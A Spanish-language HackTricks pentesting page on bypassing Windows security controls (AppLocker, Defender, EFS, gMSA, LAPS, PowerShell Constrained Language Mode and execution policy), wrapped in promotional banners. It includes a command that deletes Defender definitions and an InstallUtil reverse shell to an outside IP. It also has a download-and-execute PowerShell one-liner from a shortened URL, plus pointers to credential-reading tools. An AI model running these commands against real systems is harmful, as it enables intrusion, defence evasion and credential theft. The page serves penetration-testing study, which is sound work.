# Controles de seguridad de Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Política de AppLocker

Una lista blanca de aplicaciones es una lista de aplicaciones o ejecutables aprobados que se permiten estar presentes y ejecutarse en un sistema. El objetivo es proteger el entorno de malware dañino y software no aprobado que no se ajusta a las necesidades comerciales específicas de una organización.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) es la solución de **lista blanca de aplicaciones** de Microsoft y brinda a los administradores del sistema control sobre **qué aplicaciones y archivos pueden ejecutar los usuarios**. Proporciona un **control granular** sobre ejecutables, scripts, archivos de instalación de Windows, DLL, aplicaciones empaquetadas e instaladores de aplicaciones empaquetadas.\
Es común que las organizaciones **bloqueen cmd.exe y PowerShell.exe** y el acceso de escritura a ciertos directorios, **pero todo esto se puede eludir**.

### Verificación

Verifica qué archivos/extensiones están en la lista negra/lista blanca:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Las reglas de AppLocker aplicadas a un host también se pueden **leer desde el registro local** en **`HKLM\Software\Policies\Microsoft\Windows\SrpV2`**.

### Bypass

* Carpetas **escribibles** útiles para evadir la política de AppLocker: Si AppLocker permite ejecutar cualquier cosa dentro de `C:\Windows\System32` o `C:\Windows`, hay **carpetas escribibles** que puedes usar para **evadir esto**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Comúnmente, los binarios de **"LOLBAS"** confiables también pueden ser útiles para evadir AppLocker.
* También se pueden evadir reglas mal escritas.
* Por ejemplo, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, puedes crear una carpeta llamada `allowed` en cualquier lugar y se permitirá.
* Las organizaciones a menudo se centran en bloquear el ejecutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`, pero se olvidan de las **otras ubicaciones** [**de ejecutables de PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
* La aplicación de DLL rara vez está habilitada debido a la carga adicional que puede poner en un sistema y la cantidad de pruebas necesarias para asegurarse de que nada se rompa. Por lo tanto, el uso de DLL como puertas traseras ayudará a evadir AppLocker.
* Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para ejecutar código de Powershell en cualquier proceso y evadir AppLocker. Para obtener más información, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Almacenamiento de credenciales

### Security Accounts Manager (SAM)

Las credenciales locales están presentes en este archivo, las contraseñas están cifradas.

### Autoridad de seguridad local (LSA) - LSASS

Las **credenciales** (cifradas) se **guardan** en la **memoria** de este subsistema por razones de inicio de sesión único.\
LSA administra la **política de seguridad** local (política de contraseñas, permisos de usuarios...), **autenticación**, **tokens de acceso**...\
LSA será el encargado de **verificar** las credenciales proporcionadas dentro del archivo **SAM** (para un inicio de sesión local) y **comunicarse** con el **controlador de dominio** para autenticar a un usuario de dominio.

Las **credenciales** se **guardan** dentro del proceso LSASS: tickets de Kerberos, hashes NT y LM, contraseñas fácilmente descifrables.

### Secretos de LSA

LSA puede guardar en disco algunas credenciales:

* Contraseña de la cuenta del equipo del Active Directory (controlador de dominio inaccesible).
* Contraseñas de las cuentas de los servicios de Windows.
* Contraseñas de tareas programadas.
* Más (contraseña de aplicaciones de IIS...).

### NTDS.dit

Es la base de datos del Active Directory. Solo está presente en los controladores de dominio.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) es un antivirus que está disponible en Windows 10 y Windows 11, y en versiones de Windows Server. Bloquea herramientas comunes de pentesting como **`WinPEAS`**. Sin embargo, hay formas de evadir estas protecciones.

### Verificación

Para verificar el **estado** de **Defender**, puedes ejecutar el cmdlet de PowerShell **`Get-MpComputerStatus`** (verifica el valor de **`RealTimeProtectionEnabled`** para saber si está activo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

También puedes enumerarlo ejecutando:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## EFS (Sistema de archivos cifrado)

EFS funciona cifrando un archivo con una **clave simétrica** a granel, también conocida como Clave de Cifrado de Archivo o **FEK**. Luego, la FEK se **cifra** con una **clave pública** que está asociada con el usuario que cifró el archivo, y esta FEK cifrada se almacena en el **flujo de datos alternativo** $EFS del archivo cifrado. Para descifrar el archivo, el controlador del componente EFS utiliza la **clave privada** que coincide con el certificado digital EFS (utilizado para cifrar el archivo) para descifrar la clave simétrica que se almacena en el flujo $EFS. De [aquí](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

Ejemplos de archivos que se descifran sin que el usuario lo solicite:

* Los archivos y carpetas se descifran antes de copiarse en un volumen formateado con otro sistema de archivos, como [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table).
* Los archivos cifrados se copian a través de la red utilizando el protocolo SMB/CIFS, los archivos se descifran antes de ser enviados por la red.

Los archivos cifrados utilizando este método pueden ser **accedidos de manera transparente por el usuario propietario** (quien los ha cifrado), por lo que si puedes **convertirte en ese usuario**, puedes descifrar los archivos (cambiar la contraseña del usuario e iniciar sesión como él no funcionará).

### Verificar información de EFS

Verifica si un **usuario** ha **utilizado** este **servicio** verificando si existe esta ruta: `C:\users\<nombre de usuario>\appdata\roaming\Microsoft\Protect`

Verifica **quién** tiene **acceso** al archivo utilizando `cipher /c \<archivo>\`
También puedes utilizar `cipher /e` y `cipher /d` dentro de una carpeta para **cifrar** y **descifrar** todos los archivos.

### Descifrando archivos de EFS

#### Siendo el Sistema de Autoridad

Este método requiere que el **usuario víctima** esté **ejecutando** un **proceso** dentro del host. Si ese es el caso, utilizando una sesión de `meterpreter`, puedes suplantar el token del proceso del usuario (`impersonate_token` de `incognito`). O simplemente puedes `migrar` al proceso del usuario.

#### Conociendo la contraseña del usuario

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Cuentas de Servicio Administradas por Grupo (gMSA)

En la mayoría de las infraestructuras, las cuentas de servicio son cuentas de usuario típicas con la opción "**La contraseña nunca expira**". Mantener estas cuentas puede ser un verdadero desorden y es por eso que Microsoft introdujo las **Cuentas de Servicio Administradas**:

* No más gestión de contraseñas. Utiliza una contraseña compleja, aleatoria y de 240 caracteres que se cambia automáticamente cuando alcanza la fecha de vencimiento de la contraseña del dominio o del equipo.
* Utiliza el Servicio de Distribución de Claves (KDC) de Microsoft para crear y gestionar las contraseñas de la gMSA.
* No se puede bloquear ni utilizar para iniciar sesión de forma interactiva.
* Admite compartir en varios hosts.
* Se puede utilizar para ejecutar tareas programadas (las cuentas de servicio administradas no admiten la ejecución de tareas programadas).
* Gestión simplificada de SPN: el sistema cambiará automáticamente el valor de SPN si los detalles de **sAMaccount** del equipo cambian o si cambia la propiedad del nombre DNS.

Las cuentas de gMSA tienen sus contraseñas almacenadas en una propiedad LDAP llamada _**msDS-ManagedPassword**_, que se **restablece automáticamente** por los controladores de dominio cada 30 días, son **recuperables** por **administradores autorizados** y por los **servidores** en los que están instalados. _**msDS-ManagedPassword**_ es un bloque de datos cifrados llamado [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) y solo se puede recuperar cuando la conexión está asegurada, mediante LDAPS o cuando el tipo de autenticación es 'Sellado y seguro', por ejemplo.

![Imagen de https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

Entonces, si se está utilizando gMSA, verifica si tiene **privilegios especiales** y también verifica si tienes **permisos** para **leer** la contraseña de los servicios.

Puedes leer esta contraseña con [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
También, revisa esta [página web](https://cube0x0.github.io/Relaying-for-gMSA/) sobre cómo realizar un ataque de relé NTLM para leer la contraseña de gMSA.

## LAPS

\*\*\*\*[**Local Administrator Password Solution (LAPS)**](https://www.microsoft.com/en-us/download/details.aspx?id=46899) te permite **administrar la contraseña del administrador local** (que es **aleatoria**, única y **cambiada regularmente**) en computadoras unidas al dominio. Estas contraseñas se almacenan de forma centralizada en Active Directory y están restringidas a usuarios autorizados mediante ACL. Si tu usuario tiene suficientes permisos, es posible que puedas leer las contraseñas de los administradores locales.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## Modo de Lenguaje Restringido de PowerShell

PowerShell \*\*\*\* [**Modo de Lenguaje Restringido**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **bloquea muchas de las características** necesarias para utilizar PowerShell de manera efectiva, como bloquear objetos COM, permitir solo tipos .NET aprobados, flujos de trabajo basados en XAML, clases de PowerShell y más.

### **Verificación**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass

Un bypass es una técnica utilizada para evadir o eludir medidas de seguridad y obtener acceso no autorizado a un sistema o recurso protegido. En el contexto de la seguridad de Windows, existen varios métodos de bypass que pueden ser utilizados para comprometer la autenticación, las credenciales, el Control de Cuentas de Usuario (UAC) y el Sistema de Archivos Encriptados (EFS). Estos métodos pueden ser aprovechados por los hackers para obtener acceso no autorizado a sistemas Windows y comprometer la seguridad de los datos.

En el caso de la autenticación, un bypass puede implicar eludir o evadir los mecanismos de autenticación para obtener acceso a una cuenta de usuario sin conocer las credenciales correctas. Esto puede lograrse mediante técnicas como la fuerza bruta, el uso de contraseñas débiles o la explotación de vulnerabilidades en el sistema de autenticación.

En cuanto a las credenciales, un bypass puede referirse a la obtención de credenciales de usuario legítimas sin el conocimiento o consentimiento del propietario. Esto puede lograrse mediante técnicas como el phishing, el keylogging o la explotación de vulnerabilidades en aplicaciones o servicios que almacenan o transmiten credenciales.

El Control de Cuentas de Usuario (UAC) es una característica de seguridad de Windows que ayuda a prevenir cambios no autorizados en el sistema mediante la solicitud de confirmación o consentimiento del usuario antes de realizar ciertas acciones. Sin embargo, los hackers pueden utilizar técnicas de bypass para eludir o evadir el UAC y obtener acceso elevado o realizar cambios no autorizados en el sistema.

El Sistema de Archivos Encriptados (EFS) es una característica de seguridad de Windows que permite encriptar archivos y carpetas para proteger su contenido. Sin embargo, los hackers pueden utilizar técnicas de bypass para eludir o evadir la encriptación y acceder al contenido de los archivos encriptados sin conocer la clave de encriptación correcta.

En resumen, los bypass son técnicas utilizadas por los hackers para evadir o eludir medidas de seguridad en sistemas Windows, comprometiendo la autenticación, las credenciales, el UAC y el EFS. Es importante que los administradores de sistemas y los usuarios tomen medidas para fortalecer la seguridad de sus sistemas y protegerse contra estos tipos de ataques.
```powershell
#Easy bypass
Powershell -version 2
```
En las versiones actuales de Windows, ese bypass no funcionará, pero puedes usar [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).

**Para compilarlo, es posible que necesites** **agregar una referencia** -> **Examinar** -> **Examinar** -> agregar `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` y **cambiar el proyecto a .Net4.5**.

#### Bypass directo:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Shell inversa:

A reverse shell is a technique used by hackers to gain remote access to a target system. It involves establishing a connection from the target system to the attacker's machine, allowing the attacker to execute commands on the target system.

Una shell inversa es una técnica utilizada por los hackers para obtener acceso remoto a un sistema objetivo. Implica establecer una conexión desde el sistema objetivo hacia la máquina del atacante, lo que permite al atacante ejecutar comandos en el sistema objetivo.
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar código Powershell** en cualquier proceso y evadir el modo restringido. Para obtener más información, visita: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Política de ejecución de PS

Por defecto, está configurada como **restringida**. Las principales formas de evadir esta política son:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Más información se puede encontrar [aquí](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Interfaz de proveedor de soporte de seguridad (SSPI)

Es la API que se puede utilizar para autenticar usuarios.

El SSPI se encargará de encontrar el protocolo adecuado para dos máquinas que desean comunicarse. El método preferido para esto es Kerberos. Luego, el SSPI negociará qué protocolo de autenticación se utilizará, estos protocolos de autenticación se llaman Proveedor de Soporte de Seguridad (SSP), se encuentran dentro de cada máquina Windows en forma de una DLL y ambas máquinas deben admitir lo mismo para poder comunicarse.

### Principales SSP

* **Kerberos**: El preferido
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** y **NTLMv2**: Por razones de compatibilidad
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Servidores web y LDAP, contraseña en forma de hash MD5
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL y TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Se utiliza para negociar el protocolo a utilizar (Kerberos o NTLM, siendo Kerberos el predeterminado)
* %windir%\Windows\System32\lsasrv.dll

#### La negociación podría ofrecer varios métodos o solo uno.

## UAC - Control de cuentas de usuario

[Control de cuentas de usuario (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una característica que permite una **solicitud de consentimiento para actividades elevadas**.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilice [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas comunitarias más avanzadas del mundo.\
Obtenga acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
